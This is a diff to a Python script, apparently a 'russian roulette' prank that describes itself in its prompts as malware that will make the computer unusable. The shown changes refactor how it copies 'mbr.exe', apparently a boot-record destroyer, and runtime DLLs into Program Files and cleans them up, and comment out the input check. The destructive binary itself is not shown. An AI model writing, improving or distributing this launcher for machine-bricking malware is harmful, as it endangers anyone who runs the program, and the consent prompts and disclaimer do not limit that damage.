@@ -59,7 +59,7 @@ else:
 		os.system("cls")
 	quit()
 
-def x():
+def pfdelete():
 	os.remove("C:/Program Files/pussianroulette/mbr.exe")
 	os.remove("C:/Program Files/pussianroulette/api-ms-win-core-path-l1-1-0.dll")
 	os.remove("C:/Program Files/pussianroulette/msvcp140d.dll")
@@ -68,13 +68,15 @@ def x():
 	os.rmdir("C:/Program Files/pussianroulette/")
 
 os.mkdir("C:/Program Files/pussianroulette")
-shutil.move("temp/mbr.exe", "C:/Program Files/pussianroulette")
-shutil.move("temp/api-ms-win-core-path-l1-1-0.dll", "C:/Program Files/pussianroulette")
-shutil.move("temp/msvcp140d.dll", "C:/Program Files/pussianroulette")
-shutil.move("temp/ucrtbased.dll", "C:/Program Files/pussianroulette")
-shutil.move("temp/vcruntime140_1d.dll", "C:/Program Files/pussianroulette")
-os.rmdir("temp")
+shutil.copy2("temp/mbr.exe", "C:/Program Files/pussianroulette")
+shutil.copy2("temp/api-ms-win-core-path-l1-1-0.dll", "C:/Program Files/pussianroulette")
+shutil.copy2("temp/msvcp140d.dll", "C:/Program Files/pussianroulette")
+shutil.copy2("temp/ucrtbased.dll", "C:/Program Files/pussianroulette")
+shutil.copy2("temp/vcruntime140_1d.dll", "C:/Program Files/pussianroulette")
 
+def quit():
+	pfdelete()
+	sys.exit()
 
 confirm =  input("Do you want to play a game? This program IS MALWARE and WILL MAKE YOUR COMPUTER UNUSABLE! (yes/no)\n")
 confirm = confirm.lower()
@@ -85,10 +87,6 @@ elif confirm == "yes":
 	os.system("cls")
 else:
 	idiot()
-
-def quit():
-	x()
-	sys.exit()
 
 sure = input("""\nAre you TOTALLY sure? This program WILL delete your operating system's core components!!\n
 THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR UNUSABLE OR BRICKED MACHINES! RUN AT YOUR OWN RISK! (yes/no)\n""")
@@ -104,8 +102,8 @@ else:
 print(logo)
 guess = input("Let's play a game of russian roulette! Type a number between 1 and 6...\n")
 
-if set(guess).difference(digits):
-	idiot()
+# if set(guess).difference(digits):
+	# idiot()
 
 try:
 	guess = int(guess)
